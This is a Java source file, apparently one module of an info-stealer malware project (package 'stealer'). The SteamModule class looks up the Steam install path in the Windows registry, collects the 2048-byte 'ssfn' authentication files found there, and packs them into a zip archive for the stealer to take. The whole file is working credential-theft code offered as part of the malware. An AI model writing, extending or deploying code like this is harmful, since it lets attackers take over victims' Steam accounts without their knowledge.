package com.github.shurpe.stealer.module;

import com.github.shurpe.stealer.module.Module;
import com.sun.jna.platform.win32.Advapi32Util;
import com.sun.jna.platform.win32.WinReg;

import org.apache.commons.io.FileUtils;

import java.io.File;
import java.nio.file.Paths;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public final class SteamModule extends Module {

	public static final SteamModule INSTANCE = new SteamModule();

	private static final String REG_STEAM_KEY = "Software\\Valve\\Steam";
	private static final String SSFN_REGEX = "^ssfn\\d+$";
	private static final short SSFN_SIZE = 2048;

	@Override
	public void toOutput(final ZipOutputStream outputStream) {
		if (!Advapi32Util.registryValueExists(WinReg.HKEY_CURRENT_USER, REG_STEAM_KEY, "SteamPath")) {
			return;
		}

		final String steamPath = Advapi32Util.registryGetStringValue(
				  WinReg.HKEY_CURRENT_USER, REG_STEAM_KEY, "SteamPath");
		final File steamDir = Paths.get(steamPath).toFile();

		if (!steamDir.isDirectory()) {
			return;
		}

		final File[] steamDirFiles = steamDir.listFiles();

		if (steamDirFiles == null) {
			return;
		}

		for (final File file : steamDirFiles) {
			if (!file.isFile() || file.length() != SSFN_SIZE || !file.getName().matches(SSFN_REGEX)) {
				continue;
			}

			try {
				outputStream.putNextEntry(new ZipEntry("steam/" + file.getName()));
				outputStream.write(FileUtils.readFileToByteArray(file));
				outputStream.closeEntry();

			} catch (Exception ignored) {
			}
		}
	}
}